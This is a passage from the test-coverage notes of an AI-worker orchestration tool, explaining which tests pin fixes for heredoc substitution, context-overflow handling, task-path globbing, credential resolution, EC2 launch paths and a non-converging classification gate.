   `tests/test_phase_planning_coverage_gate.py`'s `TestSkipCoverageCheck`
   reported full coverage because every test sets the key by hand. By
   contrast `dangerously_force_strict_output` (M7) is a record only — its
   behaviour comes from `caps["force_strict_output"]` ahead of the split, so
   both paths always honoured it and only attribution was lost.

2. The local `-e` forward covers only `--runtime local`; Fly and EC2 each
   build their own `child_env = dict(os.environ)` inside their own unquoted
   `<<PY` heredoc, and both must forward the value JSON-encoded
   (`_leerie_commit_json` / `_ec2_leerie_commit_json`) — the Fly name also
   needs the `${...}` allowlist in `tests/test_bedrock_bearer_token.py` or
   its stray-substitution scan fails.

**Both heredoc scans are derived**, over every launch block rather than the
one Fly slice they originally hard-coded: `_launch_env_blocks()` feeds both
the stray-`${...}` allowlist scan and the backtick scan, which used to cover
only a 31-line Fly slice and were blind to the EC2 heredoc — an unbound
`${VAR}` anywhere in an unquoted `<<PY` body aborts under `set -euo
pipefail`, and a balanced backtick pair is read as command substitution,
silently dropping that text (`bash -n` misses it; `shellcheck -x` catches
it). Falsified both ways: injecting either defect into the EC2 body fails
naming `ec2`, and the old slice provably did not contain it.

**`_child_env_blocks()` finds every `child_env = dict(os.environ)`** in the
launcher and requires each to forward the var, so a third runtime fails
automatically — a hard-coded version once shipped covering Fly only while
being *named* `..._fly_ec2_path_too`, and EC2 recorded null until a reviewer
caught it (anti-vacuity: at least two blocks must be found, each also
setting `USER_REPO`, known present in both).

## `--dangerously-force-strict-output` context-window regression

(DESIGN §7 *Forcing constrained decoding*, §6 *A client-side context
refusal*) — covered by three files. The flag owns `ANTHROPIC_BASE_URL`, and
the CLI treats any custom base URL as an **LLM gateway**, behind which it
can no longer confirm the answering model and falls back to a conservative
client-side context ceiling instead of Sonnet 5's native 1M, refusing
prompts *itself* at ~224K with a synthetic assistant message
(`model=<synthetic>`, usage all zeros, no API call).

`tests/test_strict_proxy_context_window.py` pins `_model_arg`: `sonnet`/
`opus` gain the `[1m]` suffix only while `_STRICT_PROXY` is active, `haiku`
never does (no 1M variant), a full model id passes through untouched, the
suffix is not doubled, `_ONE_M_CONTEXT_MODELS` is a subset of `MODEL_VALUES`
(a typo would silently disable the fix), and `claude_p`'s source builds
`--model` via `_model_arg(model)` with no bare `"--model", model,` left. The
suffix is deliberately **not** admitted to `MODEL_VALUES`: inert with the
proxy off, so setting it by hand only breaks `haiku`.

`tests/test_context_overflow_classifier.py` pins `_is_context_overflow` and
`ContextOverflow` against verbatim `result` envelopes. Both
`terminal_reason == "blocking_limit"` **and** the result text are required —
the reason alone is shared with other terminal arms, and `subtype` is a
misleading `"success"` that must never be keyed on. Gated on `is_error`,
exempting `_leerie_synthetic`, disjoint from both auth classifiers.
`ContextOverflow` subclasses `BaseException`, not `WorkerError` —
`_run_checked_loop` retries `WorkerError` for its whole round budget, pure
waste for a deterministic client-side refusal — and routes to a resumable
`EXIT_LOCKED` pause whose message never says "schema" (unclassified, this
surfaced as *"worker failed schema-valid output twice: Prompt is too
long,"* costing three misdiagnoses on 2026-08-06). Extracting the handler
arm must split on `"\n    except "`, not a bare `"except "`, which
truncates at the inner `except Exception:`.

## Task-reference globbing (`_glob_task_references`)

`tests/test_task_file_globbing.py` covers a defect the same incident
surfaced but did **not** cause: markdown emphasis is stripped before glob
classification, since `*` is a `_GLOB_CHARS` member and `glob("*")` matches
every file in the repo root — measured, that handed the planner 18 files /
1.86 MB, including `LICENSE`, `.claude.json` and a prior run's 847 KB log.
Pinned: prose (`*`, `**`, `**Root**`, `_em_`, backticks) resolves nothing;
genuine references (`spec.md`, `tests/*.py`, `docs/DESIGN.md`,
`spec.{md,txt}`, a bolded path) still resolve; absolute paths and `../`
traversal resolve nothing — without that guard, separator-bearing tokens
reached **outside the repo** (`repo_root / "/bin/sh"` discards the root, so
`/bin/bash` matched a 1.4 MB binary), so containment is re-checked against
`repo_root.resolve()` independently; a task file never lists itself, while a
same-named file with different contents still does. Falsification: replaying
the pre-fix filter against the prose-only fixture matches 4 files where the
test expects none.


### `~` in task prose is approximation notation (2026-08-24)

Two runs died in `phase 2: planning` with `RuntimeError: Could not determine
home directory.`, raised by `Path("~17.9").expanduser()` from the task
sentence *"max 17,923,286 B (~17.9 MB)"*. Not environmental: `expanduser`
takes its `~user` branch for any `~` token whose first segment is non-empty,
`pwd.getpwnam("17.9")` raises `KeyError`, the string comes back unexpanded,
and pathlib converts that into `RuntimeError` — `HOME` is never read on that
branch, so it reproduces on a host with `HOME` set. The check is advisory
(one `log()` line, gates nothing), so the cost was a whole run for a warning.

Measured 2026-08-24 over the 518 task strings then stored under
`~/.leerie/*/runs/*/state.json` (a live corpus — re-running it later gives a
larger denominator): **62 distinct `~`-prefixed path-shaped tokens, 32 of
them prose, and all 32 raise**. Three of those 32 carry a
separator (`~2.5/subtask`, `~9/10`, `~14GB/64GB`), which is why the token rule
is home-*shape* (`~/…` or `~name/…`), not "contains a `/`" — a `/`-only rule
still crashes on three real corpus shapes. Differential falsification against
the same corpus: pre-fix **45 of 518** tasks raise, post-fix **0**, and the
473 non-raising tasks return byte-identical results.

The try/except is independently load-bearing: `~name/plan.md` for a name absent
from the password database is home-shaped, still raises, and must be *reported*
(it is genuinely unreadable), not propagated. Pinned by
`test_unknown_user_home_reference_is_flagged_not_raised` and, for the wrapper,
`test_advisory_never_gates_even_when_the_check_raises` — which executes
`_log_unreachable_task_references` against a check that really raises rather
than reading `phase_plan` for a `try` statement.


## EC2 read-mostly verbs (`accept-blocked`, `list`)

`accept-blocked` (validated `--runtime` against only `fly`/`local`,
mislabeling an EC2 run) and `list` (keyed its runtime view on
`fly-machine.json`/`LEERIE_FLY_APP`, rendering empty EC2 columns) are pinned
in `tests/test_ec2_launcher_readonly_verbs.py`. `accept-blocked` now
auto-detects EC2 (`_auto_detect_run_runtime`), accepts an explicit
`--runtime ec2`, and — mirroring the Fly wake-mutate-pause dance — wakes a
stopped instance, mutates `state.json` over SSH (`ec2_remote_exec`), mirrors
onto the host copy, and re-pauses only if this verb woke it, failing closed
on a missing `ec2_instance_id`. The wake must not fire the run-launch
teardown `resume_instance` arms: before the fix, both `accept-blocked` and
`accept-integration` exited into `decide_ec2_teardown`, which tried to fetch
from the instance they had just re-stopped and stamped `sync_failed_at` plus
a false "LEFT RUNNING" banner (`*_wake_does_not_fire_run_teardown`). Tests
invoke the real launcher against a stubbed `aws` composing
`tests/ec2_stub.py`'s instance tracking with an `ssh` stub that plays the
instance, running the remote command against a fixture `/work` with its
stdin attached.
`_collect_run_rows`/`_list_runs` now track an `is_ec2` axis alongside
`is_fly`, so `list --runtime ec2`/`--runtime local` filter correctly, a plain
`list` renders an EC2 status column without `LEERIE_FLY_APP`, and detection
works via the `ec2-instance.json` sidecar alone before `run.json` exists.
These `list` tests exercise `_list_runs()` directly (no launcher subprocess,
no AWS stub), mirroring `tests/test_list_runs.py`'s pattern.

## EC2 resume

`resume` routing a paused EC2 run through `resume_instance()` — distinct
from that function's own coverage in `tests/test_ec2_resume_instance.py` —
is pinned in `tests/test_ec2_launcher_resume.py` (reusing
`tests/test_ec2_e2e_provision.py`'s dispatch harness and `tests/ec2_stub.py`'s
`aws` stub, since EC2 resume lives inside the deep `RUNTIME=ec2` elif block
rather than the fast-path `stop` uses): a stopped instance issues exactly
one `start-instances` call and reaches `running`, no duplicate provisioning;
`LEERIE_EC2_SSH_TARGET` is re-resolved to the instance's NEW
`PublicIpAddress` (EC2 assigns a new public IP on every stop/start absent an
Elastic IP); `paused_at`/`pause_reason` clear and `ec2_instance_id` is
preserved; an already-`running` instance is an idempotent no-op; and neither
`terminate-instances` nor `delete-volume` is ever called, on both the
success and never-ready-timeout paths.

## Worker invocation layer

The worker invocation path is unit-tested only at the `claude_p` layer, via
a stubbed `_invoke` (`tests/test_no_result_event_retry.py`) — pinning the retry/envelope contract. `_invoke` itself (process spawn, stream
parsing, cgroup enrollment) needs a stub or live `claude` binary and lives
in a separate end-to-end tier.

## Credential resolution and expiry

The inverted credential-resolution precedence in
`_extract_claude_credentials_json` (DESIGN §6 *Credential strategy* —
`$CLAUDE_CODE_OAUTH_TOKEN` resolves ahead of Keychain and the on-disk file,
since a container cannot refresh a copied subscription token) is tested in
`tests/test_credential_precedence.py` (via `_invoke_helper` from
`tests/test_chain_credential_transport.py`): the env var wins over Keychain
(Darwin-only) and the file, wins over the file alone on non-Darwin, matches
`seed-auth.sh`'s independently-constructed JSON shape (extracted by regex so
the two can't silently diverge), Keychain still wins over the file when the
env var is unset, and no credential anywhere yields a clean rc 1.

It also pins the shape-validation gate rejecting a syntactically valid but
semantically empty Keychain/file blob (steipete/CodexBar#1844: a background
MCP-plugin OAuth flow overwrites the shared Keychain item with only
`{"mcpOAuth": {...}}`, dropping `claudeAiOauth`): an mcpOAuth-only blob
falls through to a file, or yields rc 1 with no fallback; a blob with
`claudeAiOauth` but an empty `accessToken` is rejected; both `mcpOAuth` and
a real `accessToken` together is still accepted. The synthesized blob's
mandatory `scopes:["user:inference"]` field (CLI 2.1.210 rejects a
scope-less blob as "Not logged in") is pinned byte-identical across all
three synthesized sites (`leerie`, `seed-auth.sh`, `ec2-seed-auth.sh`); the
always-forward `-e CLAUDE_CODE_OAUTH_TOKEN` injection (survives a headless
run past a copied file blob's `expiresAt`, anthropics/claude-code#21765)
sits *before* the credential-resolve `if`/`else`, not in the failure arm
where it was previously unreachable.

The paired best-effort expiry preflight, `_check_claude_credential_ttl` (a
no-op for the exempt long-lived-token path), is tested in
`tests/test_credential_ttl_preflight.py`: already-expired refuses and names
`claude /login`; inside the 90-minute threshold warns with the exact
ISO-8601 expiry and `claude setup-token` (replaying the b57027d3 incident's
expiry shape); a healthy TTL is silent; absent, malformed, or negative
(pre-1970 garbage) `expiresAt` all proceed silently (best-effort, not a hard
gate); the threshold is pinned at exactly 90 minutes — the launcher never
hard-codes an 8-hour assumption, since the community-reported range is
2–15h.

## Bedrock auth paths

The Bedrock bearer-token path (`AWS_BEARER_TOKEN_BEDROCK`, DESIGN §6
*Credential strategy*: preferred over the settings.json SSO/profile path
since a container cannot refresh a short-lived SSO token) is tested in
`tests/test_bedrock_bearer_token.py`: forwarded verbatim alongside
`CLAUDE_CODE_USE_BEDROCK` defaulting to `1` (confirmed live: the token alone
is a no-op without it) and an optional `AWS_REGION`; an explicit
`CLAUDE_CODE_USE_BEDROCK=0` still wins; the path never invokes
`bedrock_preflight()`/`aws sts get-caller-identity` and mounts no `~/.aws`;
it wins when both it and a settings.json flag are present; the pre-existing
SSO/profile path is unaffected when the bearer token is absent.

The Fly detached-launch heredoc has its own dedicated coverage for three
defects, since it is unquoted (`<<PY`) and substitutes shell expansions
inside inert-looking Python comment text: (1) a raw
`"${AWS_BEARER_TOKEN_BEDROCK}"` substitution let a `"`/`\`-bearing token
break out of the Python string literal and run as arbitrary code remotely —
fixed by JSON-encoding every heredoc-substituted value host-side, pinned by
`test_fly_heredoc_values_are_json_encoded_not_raw` and three live
end-to-end tests (`test_malicious_token_with_quote_does_not_break_out_of_python_literal`,
`test_malicious_token_with_backslash_does_not_break_out`,
`test_normal_token_unaffected_by_json_encoding`) that pipe the real
JSON-encoding lines through `python3 -`; (2) a first-draft fix comment
containing the literal text `${VAR}` crashed the launcher with `unbound
variable` under `set -u` on every Bedrock Fly launch — unconditional, worse
than the injection defect — pinned by
`test_child_env_heredoc_body_has_no_stray_unbound_var_substitution`; (3) a
balanced backtick pair in a comment was parsed by bash as command
substitution, a different mechanism unguarded by fix (1), silently dropping
that comment's text (caught by diffing `shellcheck -x leerie` against `git
stash`; `bash -n` misses it) — pinned by
`test_child_env_heredoc_body_has_no_backtick_characters`. All three were
falsified live (reintroduce, confirm red, confirm the fix turns it green).

`tests/test_bedrock_mode.py` covers the pre-existing SSO/profile path
(`detect_bedrock_mode()` / `bedrock_preflight()`), which shipped with zero
coverage: the 3-file merge and truthy-value matching (`1`/`true`/`yes`/`on`,
case-insensitive OR, tolerant of a malformed settings file), and
`bedrock_preflight()`'s three outcomes (missing `aws`, a failing `aws sts
get-caller-identity`, a valid SSO session), both via source-slicing rather
than reproducing the functions by hand.

## Terminal auth-failure classifier and routing

The `b57027d3…` incident — a container's expired OAuth session surfacing as
"worker failed schema-valid output twice" instead of a resumable pause — is
tested in `tests/test_terminal_auth_failure.py`: `_is_terminal_auth_failure`
is table-driven over the measured corpus (4 real strings positive,
mixed-case included; 8-string "API Error: …" corpus plus empty string
negative; the verbatim incident envelope true); gating mirrors
`_is_auth_or_quota_failure` (`False` without `is_error`, for
`_leerie_synthetic`, for a successful envelope discussing OAuth
legitimately, for a bare "oauth" substring — guarding the 2919-count
false-positive risk noted in the docstring — and for non-string `result`);
401/429/529 envelopes classify false here while true under
`_is_auth_or_quota_failure`, proving the two classifiers partition cleanly.
`claude_p()` routing tests replay the verbatim envelope through a stubbed
`_invoke`: completes in under 5 seconds rather than entering the ~300s
tenacity loop, raises `TerminalAuthFailure` not `WorkerError`; a control
with 401/429/529 envelopes still exhausts the real backoff loop before
raising `WorkerError`. Guards: an AST-based check (not substring — satisfied
by explanatory comments alone) that `main()`'s `except TerminalAuthFailure`
sets `exit_code = EXIT_LOCKED` (== 75) and mentions `resume`;
`_is_terminal_auth_failure` checked before `_is_auth_or_quota_failure`;
`TerminalAuthFailure` subclasses `BaseException` (propagates through
`asyncio.gather`) but not `WorkerError`. `tests/test_terminal_auth_routing.py`
covers the `claude_p`/`main()` seam separately (same assertions, plus
`_cleanup_on_abnormal_exit(st, full_purge=False)` and `abnormal = False`) —
doc-conformant per `docs/IMPLEMENTATION.md` §3 "Auth/quota backoff" after
commit `2652319` reverted an over-application of the reroute to the
transient-backoff case.

## 2026-07-19 incident: argv E2BIG and coverage-gate freeze

The 2026-07-19 incident (`argv-e2big-and-coverage-freeze`) — combined argv
E2BIG crash (root cause B) and coverage-gate freeze (root cause A) — has a
dedicated end-to-end harness in `tests/test_incident_2026_07_19.py`, backed
by synthetic, shape-matched fixtures
(`tests/fixtures/incident_2026_07_19/{shape.json,generate.py}`): task
51,142B, `subtask_views` 88,201B at `indent=2`, 114 subtasks, a 15-item
CLAUDE.md heading harvest split into 3 uncoverable convention items and 12
other headings — the real internal-audit task file is deliberately not
committed. `TestRootCauseB_ArgvE2BIG` pins that the generated ~150KB payload
exceeds `MAX_ARG_STRLEN` (131,071B) as a single string, and that `claude_p`'s
real `build()` closure constructs no argv element over that ceiling, routing
the prompt over stdin and the appended system prompt through
`--append-system-prompt-file`. `TestRootCauseA_CoverageFreeze` pins the
incident's exact 15-item harvest shape and that the mechanism which froze on
it (`extract_task_file_structure`, `_is_uncoverable_convention_item`,
`check_task_file_coverage`, `_dedup_frozen_coverage_issues`) is deleted
rather than guarded — coverage is now `task_coverage_judge`'s job, so the
freeze class cannot recur. `TestBothRootCausesComposeOnOnePayload` runs both
halves against the same fixtures in one test.

## Piped/decoupled-streaming exit path: wall-clock hang bound

`tests/test_decoupled_streaming_hang_bound.py` covers a gap
`test_log_file_persistence.py`/`test_log_file_wiring.py` leave open: both
of those use a `nerdctl` stub that writes and returns synchronously, so
neither ever exercises a background process that keeps the container's
stdout stream open past the stub's own exit -- the SSH-mux / broker
failure mode the file-based `_run_log` + launcher-owned `tail -f` design
(leerie:8811-8826) exists to route around. This test's stub forks a
detached grandchild that inherits stdout and sleeps well past the
harness's own completion, then asserts the harness still returns well
under a fixed wall-clock ceiling -- proving a lingering fd-holder can't
block the harness because `_run_log` redirects to a plain file, not a
pipe.

## Interactive (`-it`, `script`(1)-teed) exit path: wall-clock hang bound

`tests/test_interactive_script_hang_bound.py` closes the same class of gap
against the interactive branch (leerie:8877-8886, the non-Darwin
`script -qe -c "$_nerdctl_run_quoted" -a "$_log_tee_target"` block) that
`tests/test_decoupled_streaming_hang_bound.py` closed for `_run_log`.
DESIGN.md:2613-2614 asserts the interactive path "has a real pty and thus
no hang," but `test_log_file_wiring.py`'s existing interactive coverage
(`test_interactive_tty_path_is_teed_via_script` et al.) only proves the
teed output is byte-correct with a `nerdctl` stub that writes and returns
synchronously -- it never puts the `script`(1) pty allocation itself
under the lingering-background-holder condition DESIGN.md's own hang
writeup describes. This test's stub backgrounds a detached grandchild
that inherits the `script`-allocated pty as its stdout and sleeps well
past the stub's own exit, then asserts the harness still returns under a
fixed wall-clock ceiling -- putting the pty's claimed hang-proofing under
the same adversarial load, rather than merely asserting it by argument.

## Classification-gate non-convergence: the monotonic keep-list

**Run `47ee1e9e` (v0.29.0) died at phase 1 without reaching a planner.**
`judge_confirmed` in `phase_classification_gate` was monotonic: a category
confirmed in an early round could never be dropped when a later round
concretely objected to it. Round 0 reviewed `[bug-fixing, documentation]`
clean and asked for `testing`; round 1 objected to `documentation` once
`testing` had joined. The re-classify prompt then carried
`MISCATEGORIZATION (spurious_category): documentation` and "keep every one of
them in your category set: ['bug-fixing', 'documentation', 'testing']" in the
same message — an instruction no classifier can satisfy. Three judge rounds,
two re-classifies, dead before any provision or plan spend.

**The fix must not depend on why the verdict changed, because the corpus
cannot tell us.** Counting every case where a category the judge had confirmed
(reviewed without objection, or itself requested) later drew an evidenced
`spurious_category`: **16 instances across 7 of the 432 runs that invoked the
judge (1.6%), and in none was the later verdict rendered against an identical
category set.** That rules out a *proven* self-contradiction; it establishes
nothing about whether the judge refined its view. In this run's own transcript
it plainly did not: round 0 asserts the fix "will require updating
docs/architecture.md and docs/playbook.md", rounds 1 and 2 assert no
documentation deliverable is evidenced, and neither reversal mentions
`testing` — they argue a round-independent fact about the task that would have
applied equally in round 0.

Retraction is right under either reading. If the judge refined, retraction
lets it; if it resampled, retraction lets the latest evidenced verdict win and
terminates the deadlock, with the oscillation guard bounding the churn. A set
that cannot drop the current verdict makes the prompt unsatisfiable regardless.
So the fix is retraction (`judge_confirmed.difference_update(spurious)`), not
demoting the judge — 1.6% is far too low to strip terminal authority, though
it is the number to re-measure if the rate climbs.

**Tests, in `tests/test_phase_classification_gate.py`.** Three directional
tests fix the rule from three sides. The retraction row is additionally
covered by the recorded-transcript replay below, which reddens on the same
ablation; the other two are singly covered, so deleting either leaves the
rest green against a wrong rule:

| test | pins | what breaks without it |
|---|---|---|
| `test_evidenced_spurious_retracts_an_earlier_confirmation` | an evidenced objection retracts | the original deadlock returns |
| `test_narrower_later_round_does_not_retract` | OR-accumulation survives the fix | the 2026-07-31 regression returns — a round reviewing a narrower set says nothing about categories it did not look at |
| `test_vague_spurious_does_not_retract` | the anti-gaming converse | a claim too vague to gate would still strip a category |

`test_replays_the_recorded_non_converging_transcript` replays the run's own
judge responses. It deliberately uses multi-sentence evidence prose rather
than a toy string, so the drop-list formatting is exercised on a real payload
shape. Ablation: removing the `difference_update` turns both it and the
retraction test red.

**The converged-gate no-work consumer**, in `tests/test_no_work_judge.py`
(DESIGN §8 *The healthy-path consumer* — measured 2026-09-22:
`likely_already_satisfied` had exactly one reader, the exhaustion arm, so
three consecutive re-runs of an already-merged task each cited the landed
commits, converged, and shipped a PR anyway). Every behavioral test drives
the real `phase_classification_gate` with a `claude_p` stub dispatching on
`schema_key` (so the two judges' stubs cannot mask each other) and asserts
terminal-state VALUES: confirm → routed True + `no_work_required` +
`no_work_confirmation` carrying both evidences verbatim; dispute / crash /
empty-evidence confirm → planning proceeds; flag-unset,
`skip_satisfied_check`, and `skip_classification_check` (the gate never
runs, so the consumer never fires — a documented side effect) → call
count of **zero** for `no_work_judge` (anti-vacuity — an unwired hook
still "returns False"); the judge's user_prompt carries the claim text
and `required_items` (substance, not structure); the consumer resets the
judgment worktree before the spawn (same discipline as the
satisfied-probe sweep, pinned by ordering on the source); and the
exhaustion arm still routes on raw trust with no judge spawn (its
documented boundary, unchanged).

**Two traps this incident re-confirmed.**

*The exhaustion message counted the wrong thing.* It printed
`caps['judgment_check_rounds']` (3) regardless of what ran, while
`_run_checked_loop` fires feedback only while `rnd < max_rounds - 1` — so a
3-round budget re-classifies at most **twice**, and once when the oscillation
guard aborts early. Both counts are pinned
(`test_exhaustion_reports_the_real_reclassify_count`,
`test_exhaustion_count_reflects_an_early_oscillation_abort`). The first draft
of that test read the count off `SystemExit.args` and passed against the
broken message: `die()` writes to **stderr**, so the assertion was checking an
empty string. Read it with `capsys`.

*A guard for a defect class lives where the repo put it, not where the change
is.* `--skip-classification-check` was added in the same change and seeded
only under `if args.resume:` — the `skip_coverage_check` defect verbatim
(`## LEERIE_COMMIT state field` above, which also explains
`test_no_resume_only_state_keys` and `_state_init_branch_keys`). The warning
comment recording that earlier defect sits a few lines above where this one
was omitted, inside the same dict literal — no line count here, because it
moves with every edit to `_run_phases`. It was inert on every fresh run,
which is exactly the case the gate's own exhaustion `die()` tells the operator
to re-run with. `tests/test_state_fields.py::test_no_resume_only_state_keys`
catches it generically and went red; the targeted test selection that
"validated" the change never ran that file.
`test_the_skip_flag_is_actually_seeded_on_a_fresh_run` is the named pin,
importing `_state_init_branch_keys` rather than re-implementing the walk. The
consumer-side test (`test_skip_flag_never_spawns_the_judge`) hand-sets
`st.data`, so it was structurally blind to the producer — the
structure-vs-substance rule again.

**Suppression does not fix a wrong signal, and an instance is not the class.**
`CATEGORY_NO_DIR` was first made to yield to `judge_confirmed` alongside the
two RISK advisories, on the reasoning that its `docs/` heuristic is wrong for
a repo whose documentation deliverable is a root README. Yielding did not
address that: `judge_confirmed` is empty on the initial `phase_classify`, so a
correct classification was still flagged inside that function's own retry
loop, before the judge had run at all. The next attempt added a `README*`
glob — case-sensitive on Linux, so `readme.md` still flagged. Two fixes, both
of which named the class in the commit message and shipped an instance.

Measuring the check instead of reasoning about it inverted the priority.
Across 468 recorded runs (766 classifier calls) `CATEGORY_NO_DIR` fired **27
times in 19 runs, every one of them for `infrastructure` and none for
`documentation`** — on a repo that is a conventional CDK project, `cdk.json`
at the root with stacks under `src/infrastructure/`, a layout the rule matched
neither way. It never changed a classification (the classifier held
`infrastructure` in all 13 runs where it could have folded), but it **gates**
— `CATEGORY_NO_DIR` is absent from `_ADVISORY_ISSUE_LABELS` — so each firing
cost a round: within that one repo, **4.36** mean classifier calls when it
fired against **1.39** when it did not. Controlling within the project matters;
the cross-project figure is confounded, because every firing was in one repo.

The rule is now an evidence predicate (`CATEGORY_EVIDENCE` +
`_category_evidence_found`): directories case-insensitively at the root or one
level down, root marker files by case-folded stem, and root globs. Validated
against the real trees before it was written — `api` satisfied by `cdk.json`,
`leerie` and `barnacle` still unsatisfied, so the 24 false firings go and the
3 genuine ones stay. `test_vendored_match_is_not_evidence` is the anti-vacuity
counterpart to the nested-directory pin: without the `node_modules` skip that
pin would pass for the wrong reason on any npm project.
`test_message_names_every_form_of_evidence` asserts the advisory text against
`CATEGORY_EVIDENCE` rather than a hardcoded sentence — the text is the remedy
a *gating* check hands the classifier, and the old wording named only the
directories, misreporting it on all 27 firings.

General rule: when a check is wrong rather than merely ill-timed, suppressing
it later leaves the first call still wrong — and when a commit message claims
a class, the test must pin the class, or the next round finds the instance you
left.

`tests/test_resolve_skip_classification_check.py` locks the env-var name and
the `leerie.toml` key. Precedence lives in the shared `_resolve_bool_pref`, so
what this file adds is the wiring. Both `test_the_toml_key_is_not_a_sibling_key`
and `test_the_env_var_is_not_a_sibling_var` make the sources *disagree* — a
sibling set `true` while this one is explicitly `false` — because two agreeing
sources cannot distinguish a correct read from a bypass, and leaving this one
merely *unset* would test fall-through to the default rather than a
disagreement.

## Lessons worth keeping

**A handler must survive its own exception, not merely catch it.** `main()`'s
`except DiskLowSpace` arm opened with an unguarded `st.save()`, and
`State.save()`'s own out-of-space conversion is one of the three raise
sites — so on the disk-full path the save re-entered the failure and raised
again *from inside the handler*, escaping `main()` and skipping cleanup, dep
capture, and the `EXIT_LOCKED` assignment. `test_survives_a_save_that_is_still_failing`
in `tests/test_disk_preflight.py` now asserts against *every* save in the
arm; fixing that one arm was not the fix — eight other handlers carried the
identical bare `st.save()` (including `except BaseException`, where a raise
hides the real bug in `__context__`), all now routed through
`_save_state_best_effort` (logs, never raises — read-only run dirs raise
`PermissionError`, measured). The test it replaced asserted only
`issubclass(DiskLowSpace, BaseException)`, a tautology that reasoned to a
false conclusion.

**A timeout is infrastructure, not a leerie bug.** `_invoke` converts
`asyncio.TimeoutError` into `subprocess.TimeoutExpired` — an `Exception` but
**not** a `WorkerError` — so every `_run_checked_loop` caller took its
generic-bug arm and `die()`d instead of retrying, and five bare `except
WorkerError` sites let it escape entirely (the per-worker timeout table made
this ~4x more reachable for the 18 workers whose ceiling it lowered, though
the stated motivation was a hung `classifier`). The retry arm and those five
sites now name `subprocess.TimeoutExpired` alongside `WorkerError`. Never
interpolate one into a message: `str()` on a `TimeoutExpired` renders `cmd`
— the entire `claude -p` argv with an inlined system prompt, the 50 KB
terminal dump `_run_implementer`'s handler documents.
`_brief_worker_exc` names `exc.timeout` instead; `tests/test_checked_loop.py`
pins both the retry and that the argv never reaches a warning line.

**Derivation guards are one-directional unless you write the converse.**
Both `TIMEOUT_DEFAULT_PER_WORKER` tests iterated the *table*, so deleting
five entries passed the whole suite while those workers silently reverted
to the 5400s global; `test_every_measured_worker_below_the_cap_is_IN_the_table`
iterates the measured summary instead. `main()`'s caps wiring had the same
shape: its guard asserted the value line plus `"args.worker_timeout"`, which
appears *on* that line, so deleting the explicitness assignment left it
green.

**Ablate a pattern against its corpus instead of adding alternatives.**
`_host_finalize_is_auth_or_network_push_error` carried 11 alternatives;
removing each in turn showed only three load-bearing for the 9 real git
cases, and four were unreachable false-positive surface behind the
`^(fatal|remote):` anchor. Dropping them kept 9/9 and fixed three hook
misclassifications. `_host_finalize_ssh_transport_failure` was **provably
dead**: its condition was a line the first arm already matched, which ran
first.

## The repeat-run loop closure (2026-09-28)

Six features from one diagnosis (the barnacle repeat-run loop; measured
root causes in DESIGN §5 *Defect-scope audit*, §6 *A fresh run refuses a
stale base*, §8 *A dispute's evidence is planning input* / *The delivery
gate*, §12 L4; this section originally said five — the classifier rule
below shipped without a pin or an inventory entry, caught in review
round 8):

**Classifier standing-constraint extraction**, in
`tests/test_classifier_standing_constraint_prompt.py`: prompt-content
pins on the never-omitted carve-out's load-bearing clauses (the force,
the class definition, the verbatim-extraction instruction) plus a
section-ordering pin that the rule sits inside the Required-items
instructions. A prompt rule with no pin is exactly the
"present one run, absent the next" regression class the rule itself
closes.

**Dispute threading**, in `tests/test_no_work_judge.py` (extended) +
`tests/test_no_work_dispute_ctx.py`: the dispute arm persists both halves
to disk (value-asserted via a direct `state.json` read — a second
`State()` would trip the single-owner flock), and the ctx tests drive the
REAL `phase_plan`, asserting the judge's evidence text lands in the
planner prompt verbatim; falsified live — deleting the injection fails the
delivery test. Crash / confirm / empty-evidence persist nothing.

**Base freshness**, in `tests/test_base_freshness_check.py`: real repos,
real bare origin, real second writer. The load-bearing case is the
measured incident shape — origin advanced, local tracking ref stale and
EQUAL to HEAD, so only the function's own fetch can discover the
staleness; a fetch-less comparison passes it. Plus
fetched-but-not-pulled-then-offline (the stale ref alone must refuse),
ahead/diverged/no-origin/detached silent, and launcher wiring pins
(`IS_RESUME` gate, env hatch, shared truthy vocabulary).

**Operator-overlap tripwire framing**, in
`tests/test_tripwire_operator_signature.py`: predicate truth table
(all-untracked true; tracked / mixed / HEAD / ref / empty false) paired
with behavioral message tests through the real `_assert_repo_unchanged`
under `--stop-on-repo-change` — including that a worker adding a file ON
TOP of a tracked edit is never softened there (the warn-by-default path
classifies each newly-warned batch instead; see below).

**Warn-by-default sentinel**, in `tests/test_repo_change_warn_default.py`:
drives the real `_assert_repo_unchanged` against a real git repo with
`stop_on_repo_change` off — no exit, the WARNING carries the delta and the
operator/escape hint (asserted by value, not by the absence of a raise);
a persisting delta is warned once across repeated checks and a new one
warns alone, but a re-edit of a warned file, or a new file inside a warned
`?? dir/`, re-warns as "changed again" (`_delta_fingerprint`), while
gitignored churn inside a warned directory does not; the fingerprint is
`lstat`-only (a test forbids `open`), resolves C-quoted porcelain names,
and never mistakes an untracked `x -> src.txt` for a rename; a list-form
`repo_change_warned` from an earlier build is adopted on resume without
a crash or a repeat warning; the fingerprint never raises (a non-UTF-8
directory listing, an undecodable porcelain escape, any unexpected
error all give a value); a commit during planning is warned as becoming
part of what the run builds on and pushes, a file edit is not; the
baseline is untouched after a warning (it feeds `_acceptance_own_start` and
`_acceptance_report_base`); with the flag on, a HEAD move dies under the
execute-wave call shape (through the real `_execute_check_porcelain_only`)
that is silent by default, and both die framings name the way to continue
past one's own changes (resume without the flag). Plus
`resolve_stop_on_repo_change` precedence with disagreeing inputs, and
`main()` wiring driven for real up to `_orchestrate` (env alone, flag
alone, neither). The die-asserting tests in `tests/test_work_sentinel.py`
and `tests/test_tripwire_operator_signature.py` set the flag explicitly.
`tests/test_phase_execute_wave_flow.py` drives the real wave loop:
`setup-run.sh` receives the working branch, its fallback warning is
logged, and the per-wave check is porcelain-only exactly when the flag is
off.

**Run follows its working branch**, in `tests/test_working_branch_follow.py`:
real repos and the real `setup-run.sh` / `planning-worktree.sh` — with the
operator switched to another branch mid-run, the run branch and the planning
worktree still land on `refs/heads/<working_branch>` (both red against the
pre-change scripts), paired with partners that must stay green either way: a
pull of the same branch is followed, and no argument / `HEAD` / an unknown
branch falls back to the live HEAD. Plus `_working_branch_arg` and the
wiring at both call sites, and the satisfied-probe cache key:
`_base_tree_sha` must equal the HEAD the real `planning-worktree.sh` leaves
the worktree on (a live-HEAD key, the pre-fix behaviour, fails it after a
branch switch), with the HEAD fallback for no / `HEAD` / unknown branch.
Behavioural partners for what was first pinned only by source: the
switch-then-advance incident driven through two real
`_filter_satisfied_subtasks` sweeps (two probes; a live-HEAD key trusts
the stale verdict and probes once); a vanished recorded branch warns on
stderr in both scripts, `setup-run.sh` still records the requested name,
and `_ensure_planning_worktree` logs the warning while ordinary git stderr
